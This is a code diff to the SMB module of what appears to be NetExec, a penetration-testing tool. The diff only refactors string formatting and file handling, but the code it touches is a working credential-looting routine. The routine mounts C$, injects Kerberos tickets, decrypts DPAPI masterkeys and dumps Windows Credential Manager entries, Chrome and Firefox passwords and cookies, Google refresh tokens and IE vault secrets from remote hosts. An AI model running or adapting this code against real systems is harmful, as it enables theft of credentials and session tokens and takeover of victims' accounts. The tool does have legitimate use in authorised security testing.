@@ -621,7 +621,7 @@ class smb(connection):
 
             try:
                 tid = self.conn.connectTree("C$")
-                self.logger.debug(f"Successful C$ mount. User is possible admin")
+                self.logger.debug("Successful C$ mount. User is possible admin")
 
                 fid = self.conn.createFile(
                     tid,
@@ -699,7 +699,7 @@ class smb(connection):
             # Report results
             self.logger.success(f"TGT saved to: {tgt_file_abs}")
             if ccache_injected:
-                self.logger.success(f"TGT injected into current session. Use: nxc smb <target> -k --use-kcache")
+                self.logger.success("TGT injected into current session. Use: nxc smb <target> -k --use-kcache")
             else:
                 self.logger.success(f"To use this TGT, run: export KRB5CCNAME={tgt_file_abs}")
                 
@@ -992,14 +992,14 @@ class smb(connection):
         maxRemoteIp = maxRemoteIp if len("RemoteAddress") < maxRemoteIp else len("RemoteAddress") + 1
         maxClientName = max(len(sessions[i]["ClientName"]) + 1 for i in sessions)
         maxClientName = maxClientName if len("ClientName") < maxClientName else len("ClientName") + 1
-        template = ("{SESSIONNAME: <%d} "
-                    "{USERNAME: <%d} "
-                    "{ID: <%d} "
-                    "{IPv4: <16} "
-                    "{STATE: <%d} "
-                    "{DSTATE: <9} "
-                    "{CONNTIME: <20} "
-                    "{DISCTIME: <20} ") % (maxSessionNameLen, maxUsernameLen, maxIdLen, maxStateLen)
+        template = (f"{{SESSIONNAME: <{maxSessionNameLen}}} "
+                    f"{{USERNAME: <{maxUsernameLen}}} "
+                    f"{{ID: <{maxIdLen}}} "
+                    f"{{IPv4: <16}} "
+                    f"{{STATE: <{maxStateLen}}} "
+                    f"{{DSTATE: <9}} "
+                    f"{{CONNTIME: <20}} "
+                    f"{{DISCTIME: <20}} ")
 
         result = []
         header = template.format(
@@ -1063,7 +1063,7 @@ class smb(connection):
             self.logger.success("Enumerated processes")
             maxImageNameLen = max(len(i["ImageName"]) for i in res)
             maxSidLen = max(len(i["pSid"]) for i in res)
-            template = "{: <%d} {: <8} {: <11} {: <%d} {: >12}" % (maxImageNameLen, maxSidLen)
+            template = (f"{{: <{maxImageNameLen}}} {{: <8}} {{: <11}} {{: <{maxSidLen}}} {{: >12}}")
             self.logger.highlight(template.format("Image Name", "PID", "Session#", "SID", "Mem Usage"))
             self.logger.highlight(template.replace(": ", ":=").format("", "", "", "", ""))
             for procInfo in res:
@@ -1761,7 +1761,8 @@ class smb(connection):
 
         if self.args.pvk is not None:
             try:
-                self.pvkbytes = open(self.args.pvk, "rb").read()
+                with open(self.args.pvk, "rb") as pvk_file:
+                    self.pvkbytes = pvk_file.read()
                 self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
             except Exception as e:
                 self.logger.fail(str(e))
@@ -1782,144 +1783,135 @@ class smb(connection):
             use_kcache=self.use_kcache,
         )
 
-        self.output_file = open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")
+        # Use context manager for the output file
+        with open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8") as output_file:
+            
+            conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
+            if conn is None:
+                self.logger.debug("Could not upgrade connection")
+                return
 
-        conn = upgrade_to_dploot_connection(connection=self.conn, target=target)
-        if conn is None:
-            self.logger.debug("Could not upgrade connection")
-            return
+            masterkeys = collect_masterkeys_from_target(self, target, conn, system=dump_system)
 
-        masterkeys = collect_masterkeys_from_target(self, target, conn, system=dump_system)
+            if len(masterkeys) == 0:
+                self.logger.fail("No masterkeys looted")
+                return
 
-        if len(masterkeys) == 0:
-            self.logger.fail("No masterkeys looted")
-            return
+            self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
 
-        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
-
-        # Collect User and Machine Credentials Manager secrets
-        def credential_callback(credential):
-            tag = "CREDENTIAL"
-            line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
-            self.logger.highlight(line)
-            if self.output_file:
-                self.output_file.write(line + "\n")
-            self.db.add_dpapi_secrets(
-                target.address,
-                tag,
-                credential.winuser,
-                credential.username,
-                credential.password,
-                credential.target,
-            )
-
-        try:
-            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
-            self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
-            credentials_triage.triage_credentials()
-            if dump_system:
-                credentials_triage.triage_system_credentials()
-        except Exception as e:
-            self.logger.debug(f"Error while looting credentials: {e}")
-
-        dump_cookies = "cookies" in self.args.dpapi
-
-        # Collect Chrome Based Browser stored secrets
-        def browser_callback(secret):
-            if isinstance(secret, LoginData):
-                secret_url = secret.url + " -" if secret.url != "" else "-"
-                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
+            # Collect User and Machine Credentials Manager secrets
+            def credential_callback(credential):
+                tag = "CREDENTIAL"
+                line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
                 self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    secret.browser.upper(),
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.url,
-                )
-            elif isinstance(secret, GoogleRefreshToken):
-                line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    secret.browser.upper(),
-                    secret.winuser,
-                    secret.service,
-                    secret.token,
-                    "Google Refresh Token",
-                )
-            elif isinstance(secret, Cookie):
-                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret.host}{secret.path} - {secret.cookie_name}:{secret.cookie_value}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-
-        try:
-            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
-            browser_triage.triage_browsers(gather_cookies=dump_cookies)
-        except Exception as e:
-            self.logger.debug(f"Error while looting browsers: {e}")
-
-        def vault_callback(secret):
-            tag = "IEX"
-            if secret.type == "Internet Explorer":
-                resource = secret.resource + " -" if secret.resource != "" else "-"
-                line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
+                output_file.write(line + "\n")
                 self.db.add_dpapi_secrets(
                     target.address,
                     tag,
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.resource,
+                    credential.winuser,
+                    credential.username,
+                    credential.password,
+                    credential.target,
                 )
 
-        try:
-            # Collect User Internet Explorer stored secrets
-            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
-            vaults_triage.triage_vaults()
-        except Exception as e:
-            self.logger.debug(f"Error while looting vaults: {e}")
+            try:
+                credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
+                self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
+                credentials_triage.triage_credentials()
+                if dump_system:
+                    credentials_triage.triage_system_credentials()
+            except Exception as e:
+                self.logger.debug(f"Error while looting credentials: {e}")
 
-        def firefox_callback(secret):
-            tag = "FIREFOX"
-            if isinstance(secret, FirefoxData):
-                url = secret.url + " -" if secret.url != "" else "-"
-                line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
-                self.db.add_dpapi_secrets(
-                    target.address,
-                    tag,
-                    secret.winuser,
-                    secret.username,
-                    secret.password,
-                    secret.url,
-                )
-            elif isinstance(secret, FirefoxCookie):
-                line = f"[{secret.winuser}][{tag}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
-                self.logger.highlight(line)
-                if self.output_file:
-                    self.output_file.write(line + "\n")
+            dump_cookies = "cookies" in self.args.dpapi
 
-        try:
-            # Collect Firefox stored secrets
-            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn, per_secret_callback=firefox_callback)
-            firefox_triage.run(gather_cookies=dump_cookies)
-        except Exception as e:
-            self.logger.debug(f"Error while looting firefox: {e}")
+            # Collect Chrome Based Browser stored secrets
+            def browser_callback(secret):
+                if isinstance(secret, LoginData):
+                    secret_url = secret.url + " -" if secret.url != "" else "-"
+                    line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
+                    self.logger.highlight(line)
+                    output_file.write(line + "\n")
+                    self.db.add_dpapi_secrets(
+                        target.address,
+                        secret.browser.upper(),
+                        secret.winuser,
+                        secret.username,
+                        secret.password,
+                        secret.url,
+                    )
+                elif isinstance(secret, GoogleRefreshToken):
+                    line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
+                    self.logger.highlight(line)
+                    output_file.write(line + "\n")
+                    self.db.add_dpapi_secrets(
+                        target.address,
+                        secret.browser.upper(),
+                        secret.winuser,
+                        secret.service,
+                        secret.token,
+                        "Google Refresh Token",
+                    )
+                elif isinstance(secret, Cookie):
+                    line = f"[{secret.winuser}][{secret.browser.upper()}] {secret.host}{secret.path} - {secret.cookie_name}:{secret.cookie_value}"
+                    self.logger.highlight(line)
+                    output_file.write(line + "\n")
 
-        if self.output_file:
-            self.output_file.close()
+            try:
+                browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
+                browser_triage.triage_browsers(gather_cookies=dump_cookies)
+            except Exception as e:
+                self.logger.debug(f"Error while looting browsers: {e}")
+
+            def vault_callback(secret):
+                tag = "IEX"
+                if secret.type == "Internet Explorer":
+                    resource = secret.resource + " -" if secret.resource != "" else "-"
+                    line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
+                    self.logger.highlight(line)
+                    output_file.write(line + "\n")
+                    self.db.add_dpapi_secrets(
+                        target.address,
+                        tag,
+                        secret.winuser,
+                        secret.username,
+                        secret.password,
+                        secret.resource,
+                    )
+
+            try:
+                # Collect User Internet Explorer stored secrets
+                vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
+                vaults_triage.triage_vaults()
+            except Exception as e:
+                self.logger.debug(f"Error while looting vaults: {e}")
+
+            def firefox_callback(secret):
+                tag = "FIREFOX"
+                if isinstance(secret, FirefoxData):
+                    url = secret.url + " -" if secret.url != "" else "-"
+                    line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
+                    self.logger.highlight(line)
+                    output_file.write(line + "\n")
+                    self.db.add_dpapi_secrets(
+                        target.address,
+                        tag,
+                        secret.winuser,
+                        secret.username,
+                        secret.password,
+                        secret.url,
+                    )
+                elif isinstance(secret, FirefoxCookie):
+                    line = f"[{secret.winuser}][{tag}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
+                    self.logger.highlight(line)
+                    output_file.write(line + "\n")
+
+            try:
+                # Collect Firefox stored secrets
+                firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn, per_secret_callback=firefox_callback)
+                firefox_triage.run(gather_cookies=dump_cookies)
+            except Exception as e:
+                self.logger.debug(f"Error while looting firefox: {e}")
 
     @requires_admin
     def lsa(self):
